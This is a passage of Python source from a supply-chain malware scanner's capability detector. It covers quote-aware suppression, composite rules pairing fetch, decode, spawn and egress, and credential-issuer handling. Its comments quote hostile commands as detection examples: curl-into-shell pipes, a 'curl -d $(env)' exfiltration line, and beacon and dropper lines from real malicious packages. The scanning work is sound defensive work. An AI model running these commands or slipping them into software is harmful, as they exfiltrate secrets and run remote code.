        the quotes and is text. `echo "$(curl x)" | sh` pipes into a shell, so the
        `| sh` that makes it dangerous sits OUTSIDE the quotes and is not
        suppressed. The distinction is exactly the one that matters, and it falls
        out of the quote test rather than needing a second rule.
        """
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False
        encoded = line.encode("utf-8", "surrogatepass")
        statement = CapabilityDetector.DIAGNOSTIC_STATEMENT.match(encoded)
        if not statement:
            return False

        # Both ends inside the same quoted run. `column_of` is one-based, matching
        # how a finding reports a column.
        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = CapabilityDetector._quote_depth(line, first)
        closing = CapabilityDetector._quote_depth(line, last)
        if opening is None or opening != closing:
            return False

        # Quoted is not the same as inert. A shell runs `$(...)` and backticks
        # inside DOUBLE quotes, so `echo "$(curl -s https://host/s)" | sh` really
        # does fetch and execute -- the quotes are around the output, not around
        # the command. Suppressing the egress there would have taken one half of
        # the dropper composite away from a genuine fetch-and-run.
        #
        # Single quotes are inert in every shell, so a substitution inside them is
        # literal text and stays suppressed.
        # Scanned from the end of the diagnostic statement rather than the start of
        # the line, because `$(warning ...)` opens with `$(` itself. Make's
        # `warning`, `info` and `error` are FUNCTIONS, not command substitutions --
        # only `$(shell ...)` runs anything -- so counting that paren read every
        # Make diagnostic as executing its own message, which put the cobra
        # Makefile straight back to critical.
        return not (
            opening == '"'
            and CapabilityDetector._inside_substitution(line, first, begin=statement.end())
        )

    @staticmethod
    def _is_literal_backtick(content: FileContent, start: int) -> bool:
        """Whether a backtick at this offset is a character inside a single-quoted string.

        `getgrav/grav` uses the backtick as its `preg` delimiter and builds the pattern by
        concatenation: ``'`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'``.
        Every backtick in it is a character in a single-quoted PHP string, and the spawn
        pattern read the pair as a command substitution -- with a `base64_decode` a line
        below, which made it a decode-and-execute finding.

        Single quotes only. In shell, `x="`ls`"` IS a substitution: double quotes
        interpolate and backticks inside them run. A single-quoted string does not, in
        shell or in PHP, which is why the test asks which quote rather than whether there
        is one.
        """
        line = content.line_text(content.line_of(start))
        if not line:
            return False
        column = content.column_of(start) - 1
        if column >= len(line) or line[column] != "`":
            return False
        return CapabilityDetector._quote_depth(line, column) == "'"

    @staticmethod
    def _is_quoted_pipeline(content: FileContent, start: int, end: int) -> bool:
        """Whether a fetch-and-run construct lies wholly inside a quoted string.

        `_is_printed_text` above requires a PRINTER in front of the quotes, which was
        the conservative first cut of this idea. The reasoning does not need one: a `|`
        inside quotes is not a pipeline, because the shell never sees it as one. What
        the string is then used for -- echoed, assigned, passed to a function -- does
        not change that.

        Measured on the third corpus pass, where `SUSPECT.DROPPER.001` became the
        largest remaining blocker at 39 repositories. A good part of it was software
        telling its user how to install something, in a string the printer test could
        not see:

            arg0="curl -fsSL https://code-server.dev/install.sh | sh -s --"
            check_prereq bun "Install: curl -fsSL https://bun.sh/install | bash"
            handle_error "curl is not installed but --with-ollama needs it"

        The first is a variable, the second an argument to the project's own helper,
        the third an error message. None is a pipeline.

        A SUBSTITUTION inside the quotes is still a substitution -- `"$(curl -s x)"`
        runs, which is why that check is shared with the printer path -- and the
        matched text itself must contain no `$(` or backtick, so a construct that
        reaches outside its own quotes is untouched. If the string is later handed to
        `eval`, the `eval` is its own execute capability and the composite still has
        both halves.
        """
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False

        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = CapabilityDetector._quote_depth(line, first)
        if opening is None or opening != CapabilityDetector._quote_depth(line, last):
            return False

        matched = line[first : last + 1]
        if "$(" in matched or "`" in matched:
            return False
        return not (opening == '"' and CapabilityDetector._inside_substitution(line, first))

    @staticmethod
    def _inside_substitution(line: str, offset: int, *, begin: int = 0) -> bool:
        """Whether `offset` sits inside a `$(...)` or a backtick pair on this line.

        Nesting counted for `$(`, since `$(dirname $(which x))` is ordinary.
        Backticks cannot nest without escaping, so they toggle.

        `begin` skips the construct that introduced the diagnostic, which in a
        Makefile is itself spelled `$(`.
        """
        depth = 0
        backtick = False
        index = begin
        while index < min(offset, len(line)):
            if line[index] == "\\":
                index += 2
                continue
            if line.startswith("$(", index):
                depth += 1
                index += 2
                continue
            if line[index] == ")" and depth:
                depth -= 1
            elif line[index] == "`":
                backtick = not backtick
            index += 1
        return depth > 0 or backtick

    @staticmethod
    def _quote_depth(line: str, offset: int) -> str | None:
        """Which quote character encloses `offset`, or None if it is unquoted.

        Single and double quotes tracked separately, because a shell treats them
        differently and an apostrophe inside a double-quoted message -- "couldn't
        find golangci-lint" -- must not read as opening a single-quoted string.
        Escaped quotes are skipped for the same reason.
        """
        quote: str | None = None
        index = 0
        while index < min(offset, len(line)):
            character = line[index]
            if character == "\\":
                index += 2
                continue
            if quote is None and character in "\"'":
                quote = character
            elif character == quote:
                quote = None
            index += 1
        return quote

    def _resolved_capabilities(
        self, unit: FileUnit, content: FileContent
    ) -> tuple[list[CapabilityHit], list[Command]]:
        """Capabilities the patterns cannot see, resolved from the parsed tree.

        Added to the regex hits rather than replacing them. The patterns stay
        the fast path and the answer for every language this cannot parse; this
        catches what a byte pattern structurally cannot -- an aliased import, a
        bound name, a spliced string -- because those are the same primitive
        written so that no literal appears.

        Returns the commands found at spawn sites alongside the capabilities,
        since those are what the shell rules are then run against.

        Python only. `ast` is in the standard library, so this costs nothing
        against the zero-runtime-dependency constraint. JavaScript needs a
        parser that is not, which is a decision about that constraint rather
        than a line of code, and it is not taken here.
        """
        if unit.language != "python":
            return [], []

        from cordon_scanner.detect.pyast import PythonAnalyzer

        resolved = PythonAnalyzer.analyse(content.text)
        return (
            [
                CapabilityHit(
                    capability=hit.capability,
                    rule_id=f"AST.PY.{hit.capability.name}",
                    byte_start=self._span_of_line(content, hit.line)[0],
                    byte_end=self._span_of_line(content, hit.line)[1],
                    line=hit.line,
                    fixed=hit.fixed_command,
                    resolved=True,
                )
                for hit in resolved
            ],
            [embedded.Command(text=hit.command, line=hit.line) for hit in resolved if hit.command],
        )

    @staticmethod
    def _span_of_line(content: FileContent, line: int) -> tuple[int, int]:
        """The byte range of a 1-based line.

        The AST tier and the embedded-shell tier report a line and no offsets,
        because neither works on byte positions -- one walks a syntax tree and
        the other matches inside an extracted string. Both used to record
        `byte_start=0, byte_end=0`, and when such a hit anchored a composite the
        report showed the first line of the file as the evidence for a finding
        located elsewhere, with a match hash taken over zero bytes: every one of
        those findings carried `sha256:e3b0c442...`, the hash of the empty
        string, under an explanation promising that "the hash identifies it".

        Converting the line back to a span costs a lookup and makes the
        evidence, the hash and the location describe the same thing.
        """
        starts = content.line_starts
        if not starts or line < 1:
            return (0, 0)
        index = min(line, len(starts)) - 1
        start = starts[index]
        end = starts[index + 1] if index + 1 < len(starts) else len(content.raw)
        return (start, max(start, end))

    CREDENTIAL_STORE_RULE = "SUSPECT.EXFIL.CREDENTIAL_STORE.001"
    """The one composite the authentication-filename ceiling applies to."""

    DROP_POINT_RULE = "INTEL.EGRESS.DROP_POINT.001"
    """Rule id for egress to a destination that is itself informative.

    Named so composites can refer to it. It is a capability label rather than a
    finding, like the AST tier's, and it exists because the capability model
    deliberately cannot tell one outbound request from another -- posting to a
    metrics endpoint and posting to a Discord webhook are both `egress`.
    """

    def _ast_rule_capabilities(
        self,
        content: FileContent,
        candidates: tuple[CompiledRule, ...],
        language: str | None,
    ) -> list[CapabilityHit]:
        """Capability primitives from `kind: ast` rules, resolved by parsing.

        Why these are primitives rather than findings of their own. Every rule
        in the pack is either a capability label or a composite over labels, and
        the composites already carry the correlation, the proximity window, the
        install-time context and the scoring. An `ast` rule that produced its
        own finding would need all of that again; an `ast` rule that produces a
        LABEL makes every composite already written -- dropper, exfil, reverse
        shell, decode-then-execute -- resolve through aliases and folded strings
        for free.

        So this is not a second detection engine beside the regex one. It is
        the same engine, given eyes for the shapes a byte pattern structurally
        cannot see:

            f = os.system          # the call site says `f`
            f(command)

            getattr(os, "sys" + "tem")(command)   # the name is never written

        Python only, because Python is the only language with a parser in the
        standard library and `intel`-free parsing was a condition of this
        project having no runtime dependencies. Every other language keeps the
        byte tier, which is why this is additive: a file this cannot parse is
        not a file that went unexamined.
        """
        if language != "python":
            return []
        ast_rules = [c for c in candidates if c.match.kind is MatchKind.AST and c.match.ast_query]
        if not ast_rules:
            return []

        from cordon_scanner.detect.pyast import PythonAnalyzer

        calls = PythonAnalyzer.calls(content.text)
        if not calls:
            return []

        hits: list[CapabilityHit] = []
        for compiled in ast_rules:
            capability = compiled.rule.capability
            if capability is None:
                continue
            for call in compiled.match.ast_query.matching(calls):
                start, end = self._span_of_line(content, call.line)
                hits.append(
                    CapabilityHit(
                        capability=capability,
                        rule_id=compiled.id,
                        byte_start=start,
                        byte_end=end,
                        line=call.line,
                        resolved=True,
                    )
                )
        return hits

    @classmethod
    def _destination_capabilities(
        cls, content: FileContent, language: str | None = None
    ) -> list[CapabilityHit]:
        """Egress to a destination that means something on its own.

        Webhook ingest URLs, anonymous paste and file-drop services, and
        out-of-band interaction hosts. None of these is a finding by itself --
        software does post to webhooks -- but each is a place with no reason to
        appear in a build, an install script or a library, so it raises what an
        outbound request in that file is worth.

        The host list lives in `intel/hosts.py` rather than in a pattern pack.
        A pack would have to restate it, and a restated blocklist drifts, which
        is worse than a short one because it still looks maintained.
        """
        from cordon_scanner.intel.hosts import could_match, destination_matcher

        raw = content.raw

        # A substring prefilter, for the same reason the rule engine has one:
        # the alternation over every host is around eight hundred bytes and
        # cost roughly five milliseconds per file when it ran unconditionally,
        # which was enough to put a large repository over its latency budget by
        # itself. Almost every file is rejected here without a regex running.
        if not could_match(raw):
            return []

        # Skipping documentation, which names a host without contacting one.
        # This searched the raw bytes and took the first hit, so a module whose
        # opening paragraph explains what it drives was read as driving it --
        # see `core.comments.docstring_spans` for the case that found it. The
        # later occurrences are still considered, because the first being prose
        # says nothing about the rest of the file.
        from cordon_scanner.core.comments import docstring_spans

        ignore = docstring_spans(raw, language)
        blocks = block_comment_spans(content.text, language)

        match = None
        for candidate in destination_matcher().finditer(raw):
            offset = candidate.start()
            if inside_spans(ignore, offset) or inside_spans(blocks, offset):
                continue
            if cls._is_comment(content, offset, language):
                continue
            match = candidate
            break
        if match is None:
            return []

        return [
            CapabilityHit(
                capability=Capability.EGRESS,
                rule_id=cls.DROP_POINT_RULE,
                byte_start=match.start(),
                byte_end=match.end(),
                line=content.line_of(match.start()),
            )
        ]

    def _embedded_capabilities(
        self, ctx: ScanContext, content: FileContent, commands: list[Command]
    ) -> list[CapabilityHit]:
        """Shell rules, applied to shell commands written inside other languages.

        A command handed to a spawn primitive is shell, whatever the file
        extension says. Without this it is examined by the rules for the host
        language, which see a string literal, and never by the rules that know
        what the string means -- so `os.system("curl -d $(env) https://...")`
        reads as one unremarkable spawn rather than as exfiltration.

        Only the command text is matched, never the surrounding file, so this
        cannot pick up a URL from a comment or an example from a docstring. The
        hit is attributed to the line the call is on, which is where a reader
        needs to look.
        """
        if not commands:
            return []

        if content.path.endswith((".sh", ".bash", ".zsh", ".ps1", ".psm1")):
            # A command the shell rules already matched in the file itself is not
            # examined twice; running them again would double the evidence without
            # adding anything to it.
            #
            # A DECODED command is the exception, and the reason this is a filter
            # rather than a return. It was base64 a moment ago, so it is not in the
            # file for any rule to have matched -- and dropping it here is what let
            # `powershell -EncodedCommand <blob>` in a `.ps1` scan clean while the
            # same line inside a `setup.py` was reported.
            commands = [command for command in commands if command.text not in content.text]
            if not commands:
                return []

        # Paired with their capability here so the match loop has nothing
        # optional left to unwrap.
        shell_rules = [
            (compiled, compiled.rule.capability)
            for compiled in ctx.rules.for_language("shell")
            if compiled.rule.capability is not None and compiled.match.regex is not None
        ]
        if not shell_rules:
            return []

        hits: list[CapabilityHit] = []
        seen: set[str] = set()

        for command in commands:
            payload = command.text.encode("utf-8", "surrogatepass")
            for compiled, capability in shell_rules:
                if compiled.id in seen or compiled.match.regex is None:
                    continue
                prefilter = compiled.match.prefilter
                if prefilter and not any(literal in payload for literal in prefilter):
                    continue
                if compiled.match.regex.search(payload) is None:
                    continue
                seen.add(compiled.id)
                start, end = self._span_of_line(content, command.line)
                hits.append(
                    CapabilityHit(
                        capability=capability,
                        rule_id=compiled.id,
                        byte_start=start,
                        byte_end=end,
                        line=command.line,
                    )
                )

        return hits

    # -- Reasoning -------------------------------------------------------

    def _composite_findings(
        self,
        unit: FileUnit,
        ctx: ScanContext,
        hits: list[CapabilityHit],
        candidates: tuple[CompiledRule, ...],
    ) -> Iterable[Finding]:
        if not hits:
            return

        # Depth is summed over distinct operations rather than over rules. One
        # decode rule covers base64, hex and decompression, so counting rules
        # cannot tell one decoding step from three.
        #
        # The AST tier is excluded. It is a second view of the same call --
        # resolving what a pattern could not see, not finding another decode --
        # so counting it too would make every parsed Python file appear to
        # decode twice. That reasoning lives in `_evaluate_over`, which is
        # where the counting now happens, because a composite with a proximity
        # counts what is inside its window rather than what is in the file.
        in_hook = ctx.in_install_hook(unit.path)
        in_ci = ctx.in_ci_hook(unit.path)
        in_consumer = ctx.in_consumer_install(unit.path)
        # Install-time context is decided per WINDOW, not per file. A file is in
        # the closure because a hook imports it, and importing a module defines
        # its functions without calling them -- so a pair of capabilities inside
        # a body nothing reaches does not run at install time, whatever the file
        # does. See `ScanContext.install_hook_reaches`.
        deferred = (
            frozenset(
                (first, last)
                for path, first, last in ctx.install_deferred_lines
                if path == unit.path
            )
            if in_hook
            else frozenset()
        )

        for compiled in candidates:
            if compiled.match.kind is not MatchKind.COMPOSITE:
                continue
            if compiled.match.scope not in {"file", "function"}:
                continue

            window = self._satisfying_window(
                compiled, hits, unit.path, in_hook, in_ci, in_consumer, deferred
            )
            if window is None:
                continue

            matched_capabilities = self._capabilities_of(compiled)
            if (
                Capability.CREDENTIAL in matched_capabilities
                and Capability.EGRESS in matched_capabilities
                and self._credential_reaches_its_own_issuer(unit.content, window)
            ):
                # Authentication, not exfiltration. See
                # `_credential_reaches_its_own_issuer`.
                continue

            local_by_capability = {hit.capability: hit for hit in window}
            matched = matched_capabilities
            anchor = self._anchor(matched, local_by_capability, window)

            finding = self._composite_finding(compiled, unit, ctx, anchor, matched, window)
            if finding is not None:
                yield finding

    BYTES_PER_LINE = 200
    """How far apart in bytes `proximity` lines are allowed to be.

    Proximity is a line count, and a minifier deletes lines. On a bundle the
    whole file is line 1, so "within five lines" means "anywhere in the file"
    and a composite that was written to say *this file does both things in the
    same breath* silently becomes *this file does both things*.

    `ethers`, the most used Ethereum library there is, showed this: two hits at
    line 1 of `dist/ethers.min.js`, thousands of bytes apart, reported as
    private key material sent to the network at CRITICAL. And a MALICIOUS
    composite is deliberately exempt from the minified ceiling -- malware is not
    excused for being generated -- so nothing downstream would have caught it.

    Two hundred bytes a line is generous for real source, where the mean is
    nearer forty, so this never narrows a window on code somebody wrote by hand.
    What it does is stop a window from spanning a bundle."""

    MAX_PROXIMITY_HITS = 400
    """Above this many capability hits, proximity is not evaluated.

    The search is quadratic in the number of hits, and a file with four hundred
    of them is generated or enormous. Falling back to file scope there reports
    more rather than less, which is the safe direction: the alternative is a
    scan that quietly skips a rule on the largest files."""

    def _satisfying_window(
        self,
        compiled: CompiledRule,
        hits: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
    ) -> list[CapabilityHit] | None:
        """The hits that satisfy this composite, or `None` if none do.

        With no `proximity` the window is the whole file, which is what every
        composite meant before proximity existed. With one, the capabilities
        must appear within that many lines of each other -- so a claim that a
        file fetches and executes becomes a claim that one *part* of it does,
        which is what the message has always said.
        """
        proximity = compiled.match.proximity
        if proximity <= 0 or len(hits) > self.MAX_PROXIMITY_HITS:
            if self._evaluate_over(
                compiled, hits, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return hits
            return None

        # Sorted by line ALONE, and stably. Adding `byte_start` to the key looks
        # harmless and is not: a window is `ordered[index:]`, so it drops every
        # hit that sorts earlier, and the AST tier's `fixed` marker sits on the
        # same line as the pattern hit it qualifies. Reordering the two put the
        # marker behind the window, `fixed_lines` came out empty, and
        # `subprocess.run(["git", "rev-parse", "HEAD"])` -- an argv written out
        # in full -- satisfied `SUSPECT.DECODE_EXEC.001` again. The existing
        # test for it is what caught this.
        ordered = sorted(hits, key=lambda h: h.line)
        byte_limit = proximity * self.BYTES_PER_LINE
        for index, first in enumerate(ordered):
            limit = first.line + proximity
            window = [
                h
                for h in ordered[index:]
                if h.line <= limit and abs(h.byte_start - first.byte_start) <= byte_limit
            ]
            if self._evaluate_over(
                compiled, window, path, in_hook, in_ci, in_consumer, deferred, all_hits=hits
            ):
                return window
        return None

    def _evaluate_over(
        self,
        compiled: CompiledRule,
        window: list[CapabilityHit],
        path: str,
        in_hook: bool,
        in_ci: bool,
        in_consumer: bool = False,
        deferred: frozenset[tuple[int, int]] = frozenset(),
        *,
        all_hits: list[CapabilityHit] | None = None,
    ) -> bool:
        all_hits = window if all_hits is None else all_hits
        # A spawn whose whole argv is written out in the source does not count.
        #
        # Every composite that names `spawn` uses it as evidence that something
        # unknown runs -- decoded data, a downloaded file, a credential's worth of
        # harvested output. `subprocess.run(["git", "rev-parse", "--short", "HEAD"])`
        # cannot be any of those: what it runs is in the file, in front of the
        # reader.
        #
        # `NousResearch/hermes-agent` produced eleven `SUSPECT.DECODE_EXEC.001`
        # anchored on exactly that shape -- `["ldd", "--version"]`, `["launchctl",
        # "list", label]`, `["git", "rev-parse"]` -- each paired with a base64
        # decode somewhere else in the file. Across the corpus `SUSPECT.DECODE_EXEC
        # .001` was 684 findings in 252 of 1,487 repositories.
        #
        # What keeps the real cases is that a constant argv is ANALYSED rather than
        # trusted: `os.system("curl x | sh")` is constant too, and the embedded-shell
        # tier extracts the fetch and the pipe from it as capabilities of their own,
        # which satisfy the composite on their own terms. And a constant command
        # naming a temporary or relative path is not treated as fixed at all, because
        # that is where a dropper puts its payload.
        # By LINE, not by hit. The pattern tier and the AST tier both see the same
        # call -- `CAP.PY.SPAWN.001@222` and `AST.PY.SPAWN@222` -- and only the AST
        # tier can say whether the argv was written out, so dropping its own hit
        # alone left the pattern tier's to satisfy the term anyway.
        # Unless the argv that was written out is ITSELF the act. The discount rests
        # on one claim -- that a spawn whose whole command is visible cannot be
        # running something decoded or downloaded -- and that claim holds for
        # `subprocess.run(["git", "rev-parse", "--short", "HEAD"])` and fails
        # completely for `os.system("curl https://kotko.me/analyze.php?procoder")`.
        # Both are fully literal. In the second the literal is the attack, and being
        # readable is not the same as being harmless.
        #
        # So a line whose command carried a capability of its own keeps its spawn.
        # `CAP.SH.*` is the marker for that: those hits exist only because the shell
        # rules were applied to the command string a spawn was handed, so one on this
        # line means the argv itself fetches, decodes or persists.
        #
        # Measured. `procoder`'s `setup.py` is `os.system("curl <url>")` and nothing
        # else; the spawn was discounted, only `egress` survived, and
        # `MALWARE.DROPPER.001` needs both -- so an install-time beacon in four lines
        # of Python produced no finding. Six of the packages still missed after the
        # reconnaissance work were this shape, `duc193`'s
        # `os.system("wget -O ~/.mal/.neofetch.py <url>")` among them.
        #
        # Computed over every hit in the FILE rather than over the window, and
        # that is load-bearing rather than tidy. "This line's argv is written
        # out in full" is a fact about the line; which window happens to be
        # under evaluation cannot change it. Scoping it to the window made the
        # discount depend on hit ORDER, because a window is `ordered[index:]`
        # and drops everything sorting earlier -- so a window starting at a
        # spawn hit that sorted after the `fixed` marker on the same line
        # contained no marker at all, `fixed_lines` came out empty, and the
        # discount silently did not apply.
        #
        # This is the second time that shape has bitten. The comment on
        # `ordered` records the first: adding `byte_start` to the sort key
        # reordered the marker behind the window and `subprocess.run(["git",
        # "rev-parse", "--short", "HEAD"])` satisfied `SUSPECT.DECODE_EXEC.001`
        # again. It was fixed by preserving the order, which left the real
        # fragility in place -- appending any new spawn-labelling tier after
        # the marker reproduced it exactly, and adding the `ast` match kind
        # did. Taking the fact from the file removes the ordering dependency
        # instead of restating the rule that protects it.
        speaking_argv = {
            hit.line
            for hit in all_hits
            if hit.rule_id.startswith("CAP.SH.") and hit.capability is not Capability.SPAWN
        }
        fixed_lines = {hit.line for hit in all_hits if hit.fixed} - speaking_argv
        window = [
            hit
            for hit in window
            if not (hit.capability is Capability.SPAWN and hit.line in fixed_lines)
        ]
        # The file runs at install time; this window has to as well. If any hit
        # in it sits in a body the hooks never call, the pair the composite
        # describes is not something that happens during an install -- so the
        # `context: install_hook` term is not satisfied for THIS window, even
        # though it is for the file.
        #
        # `any` rather than `all`: the claim is that these capabilities occur
        # together during an install, and one half of the pair sitting in dead
        # code is enough for that not to be true.
        if in_hook and deferred and any(cls_in(hit.line, deferred) for hit in window):
            in_hook = False

        present = {hit.capability for hit in window}
        counts: Counter[Capability] = Counter()
        for hit in window:
            if not hit.resolved:
                counts[hit.capability] += hit.variants
        fired = frozenset(hit.rule_id for hit in window)
        return self._evaluate(compiled, present, path, in_hook, counts, fired, in_ci, in_consumer)

    def _evaluate(
        self,
        compiled: CompiledRule,
        present: set[Capability],
        path: str,
        in_hook: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
        in_ci: bool = False,
        in_consumer: bool = False,
    ) -> bool:
        """Evaluate a composite expression against the capabilities present.

        Supports ``all``, ``any``, nested combinations, and ``unless``. Kept
        deliberately small: a composite rule is read by somebody deciding whether
        a security finding is justified, and an expression language rich enough
        to be clever is one nobody can review.
        """
        match = compiled.match
        counts = counts if counts is not None else Counter(present)

        if match.all_of and not all(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.all_of
        ):
            return False
        if match.any_of and not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.any_of
        ):
            return False
        return not any(
            self._term(
                term,
                present,
                path=path,
                in_hook=in_hook,
                in_ci=in_ci,
                in_consumer=in_consumer,
                counts=counts,
                fired=fired,
            )
            for term in match.unless
        )

    def _term(
        self,
        term: object,
        present: set[Capability],
        *,
        path: str | None = None,
        in_hook: bool = False,
        in_ci: bool = False,
        in_consumer: bool = False,
        counts: Counter[Capability] | None = None,
        fired: frozenset[str] = frozenset(),
    ) -> bool:
        if not isinstance(term, dict):
            return False

        if "capability" in term:
            try:
                capability = Capability(str(term["capability"]))
            except ValueError:
                return False
            required = term.get("at_least")
            if required is None:
                return capability in present
            # Depth, not presence. `decode` twice in one file is a decode
            # chain -- base64 into decompress into execute -- and that is a
            # stronger claim than decoding once, because a single decode has
            # ordinary uses and stacking them has none.
            observed = (counts or Counter(present))[capability]
            return observed >= int(required)

        # A named indicator rather than a capability.
        #
        # Some evidence is not a behaviour, it is a destination: posting to a
        # Discord webhook and posting to a metrics endpoint are both `egress`,
        # and the capability model deliberately cannot tell them apart. This
        # term lets a composite say "that specific rule fired" without
        # inventing a capability for every indicator, which is what would
        # otherwise happen and would dilute the primitives until they meant
        # nothing.
        if "rule" in term:
            return str(term["rule"]) in fired

        if "any" in term:
            return any(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["any"] or ()
            )

        if "all" in term:
            return all(
                self._term(
                    t,
                    present,
                    path=path,
                    in_hook=in_hook,
                    in_ci=in_ci,
                    in_consumer=in_consumer,
                    counts=counts,
                    fired=fired,
                )
                for t in term["all"] or ()
            )

        if "path_glob" in term and path is not None:
            from cordon_scanner.core.walker import PathGlob

            return PathGlob.matches(path, str(term["path_glob"]))

        # Execution context as a first-class term.
        #
        # This is what lets a rule say "credential access plus network egress,
        # in an install hook" without also requiring an execution primitive. In
        # application code that pairing needs a third signal to be meaningful,
        # because reading configuration and calling an API is what an
        # application does all day. In an install hook it does not: the hook IS
        # the execution, so the pair alone is already the whole attack.
        if "context" in term:
            named = str(term["context"])
            if named == "install_hook":
                return in_hook
            if named == "ci_hook":
                return in_ci
            if named == "consumer_install":
                return in_consumer
            return False

        return False

    @staticmethod
    def _capabilities_of(compiled: CompiledRule) -> tuple[Capability, ...]:
        """Every capability named anywhere in a composite expression."""
        found: list[Capability] = []

        def walk(term: object) -> None:
            if not isinstance(term, dict):
                return
            if "capability" in term:
                with suppress(ValueError):
                    found.append(Capability(str(term["capability"])))
            for key in ("all", "any"):
                for nested in term.get(key) or ():
                    walk(nested)

        for term in (*compiled.match.all_of, *compiled.match.any_of):
            walk(term)
        return tuple(dict.fromkeys(found))

    #: How much of the finding each capability carries, most specific first.
    #: A compound primitive names the whole act by itself -- `fetch_exec` IS
    #: "the download is the interpreter's input" -- while `egress` and `spawn`
    #: are the two that appear in ordinary code constantly.
    ANCHOR_SPECIFICITY: ClassVar[tuple[Capability, ...]] = (
        Capability.FETCH_EXEC,
        Capability.DESERIALIZE,
        Capability.EXECUTE,
        Capability.DYNAMIC_DISPATCH,
        Capability.WALLET,
        Capability.MINE,
        Capability.CREDENTIAL,
        Capability.PERSIST,
        Capability.ANTI_ANALYSIS,
        Capability.DECODE,
        Capability.DECOMPRESS,
        Capability.RECONNAISSANCE,
        Capability.DELAY,
        Capability.SPAWN,
        Capability.EGRESS,
    )

    @staticmethod
    def _anchor(
        matched: tuple[Capability, ...],
        by_capability: dict[Capability, CapabilityHit],
        hits: list[CapabilityHit],
    ) -> CapabilityHit:
        """Where to point the finding.

        The hit that carries the most of the claim, and the earliest of those.

        This was the earliest hit of any named capability, on the reasoning that
        the first contributing line puts the reader at the start of the
        construct. That holds when the capabilities ARE one construct, and
        `curl ... | bash` -- where every capability is on the one line -- still
        anchors exactly where it did. It fails at the proximity a composite
        allows: `SUSPECT.DROPPER.001` pairs hits up to two hundred lines apart,
        so the earliest is routinely nowhere near the evidence.

        Of sixteen DROPPER findings sampled from the corpus, eight pointed
        somewhere misleading. milvus showed `PWD := $(shell pwd)` on line 13 for
        a `curl | sh` on 143; hiddify showed `ifeq ($(shell uname),Darwin)` on
        34 for one on 162; community-scripts showed twelve lines of figlet ASCII
        ART for a `source <(curl ...)` ten lines below it. Every one of those
        findings was CORRECT, and every one of them reads as a tool that does
        not know what it is looking at -- which is the more expensive failure,
        because a false positive is argued with and this is simply disbelieved.
        """
        relevant = [by_capability[c] for c in matched if c in by_capability]
        order = CapabilityDetector.ANCHOR_SPECIFICITY

        def rank(hit: CapabilityHit) -> int:
            try:
                return order.index(hit.capability)
            except ValueError:
                # A primitive nobody has graded yet sorts between the compound
                # ones and the two broad ones, rather than winning by accident.
                return len(order) - 2

        return min(relevant or hits, key=lambda h: (rank(h), h.byte_start))

    MIN_IDIOM_BYTES = 40
    """How long the shared construct must be to be worth grouping on.

    The same forty bytes `Engine.MIN_IDIOM_SNIPPET` uses, and for its reason:
    `cidr_blocks = ["0.0.0.0/0"]` is twenty-seven and hashes the same in a
    hundred unrelated modules.
    """

    @classmethod
    def _with_idiom_key(
        cls,
        evidence: Evidence,
        content: FileContent,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
    ) -> Evidence:
        """Carry a second hash: the one `Engine._collapse_idiom` groups on.

        Those two questions had one answer and they are not the same question.
        The evidence should point at the hit that carries the claim -- that is
        what `_anchor` is for, and why `community-scripts/ProxmoxVE` stopped
        being shown twelve lines of figlet ASCII art. The COLLAPSE has to group
        on the part that is shared, which is the generic half: six hundred of
        that repository's container scripts open with a byte-identical
        `source <(curl -fsSL .../build.func)`, and that line is what makes them
        one decision applied six hundred times rather than six hundred findings.

        Keying the collapse on the evidence meant moving the anchor silently
        switched the collapse off: its persistence findings went from one to
        twenty-seven in a single pass, which is how this was noticed at all.

        So the anchor stays the most specific hit and this is the broadest one.
        Absent when the shared construct is too short to be specific, which is
        the same condition the collapse applies to a snippet.
        """
        broadest = cls._broadest(matched, hits)
        if broadest is None:
            return evidence
        raw = content.raw[broadest.byte_start : broadest.byte_end]
        if len(raw) < cls.MIN_IDIOM_BYTES:
            return evidence
        metadata = dict(evidence.metadata)
        metadata["idiom_hash"] = Evidence.hash_bytes(raw)
        return replace(evidence, metadata=tuple(sorted(metadata.items())))

    @classmethod
    def _broadest(
        cls, matched: tuple[Capability, ...], hits: list[CapabilityHit]
    ) -> CapabilityHit | None:
        """The least specific contributing hit -- the mirror of `_anchor`."""
        order = cls.ANCHOR_SPECIFICITY
        wanted = set(matched)
        relevant = [h for h in hits if h.capability in wanted] or hits
        if not relevant:
            return None

        def rank(hit: CapabilityHit) -> tuple[int, int]:
            try:
                index = order.index(hit.capability)
            except ValueError:
                index = len(order) - 2
            return (-index, hit.byte_start)

        return min(relevant, key=rank)

    #: Credentials whose issuer is known, and the hosts that issue them.
    #:
    #: Sending a service's own token to that service is authentication. It is
    #: what the token is FOR, it happens in every CI script and packaging script
    #: that reads a private repository, and it gives an attacker nothing: the
    #: host already knows the credential.
    ISSUER_HOSTS: ClassVar[tuple[tuple[tuple[bytes, ...], tuple[bytes, ...]], ...]] = (
        ((b"GITHUB_TOKEN", b"GH_TOKEN", b"GITHUB_PAT"), (b"github.com", b"githubusercontent.com")),
        ((b"GITLAB_TOKEN", b"CI_JOB_TOKEN"), (b"gitlab.com",)),
        ((b"NPM_TOKEN", b"NODE_AUTH_TOKEN"), (b"registry.npmjs.org", b"npmjs.com")),
        ((b"PYPI_TOKEN", b"TWINE_PASSWORD"), (b"pypi.org", b"files.pythonhosted.org")),
        ((b"CARGO_REGISTRY_TOKEN",), (b"crates.io",)),
